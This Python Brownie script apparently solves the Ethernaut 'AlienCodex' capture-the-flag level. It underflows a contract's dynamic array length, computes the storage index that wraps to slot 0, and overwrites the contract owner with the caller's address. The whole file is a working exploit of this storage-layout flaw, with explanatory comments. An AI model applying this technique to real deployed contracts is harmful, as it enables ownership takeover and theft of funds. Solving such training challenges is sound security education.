from scripts.helper.utils import *
from scripts.helper.account import _from, acc
from scripts.helper.web3 import web3
from eth_abi import encode_abi
from brownie import AlienCodex

##########################################
# Claim ownership to complete the level.
#########################################

# solve the challenge
def solve_challenge(locally=False):
    # load challenge
    if not locally:
        aliencodex = load_challenge(ContractObject=AlienCodex, instance_key='aliencodex')
    else:
        aliencodex = deploy_locally(ContractObject=AlienCodex, from_account=_from)

    # make contact to be able to pass through the contacted() modifier
    aliencodex.make_contact(_from)
    
    # overflow the codex length
    aliencodex.retract(_from)

    # since we have overflowed the size of the array codex, we can modify
    # parts of the contract storage that we would otherwise not be able to modify
    # as if they were part of the array, given that the array's length is overflowed
    # there are only 2**256-1 storage slots in a contract, and an array can take up the entire storage
    # so other state variables, like _owner inherited from the Ownable contract
    # which is at position 0x0 in storage, can be accessed and modified using the keccak256 hash
    # of the item 0 in the array (as _owner would occupy this position)
    position_one = encode_abi(['uint256'],[1]).hex()
    owner_hash = hex(2**256 - int(web3.sha3(hexstr=f"0x{position_one}").hex(),16))

    # modify the element in the position described by owner_hash
    # as if it were part of the array
    aliencodex.revise(owner_hash, acc.address, _from)

    # check if we're owner
    owner_assertion = aliencodex.owner() == acc.address
    print(f"Address {acc.address} is the owner of the contract: {owner_assertion}")

    return owner_assertion

def main():
    solve_challenge()
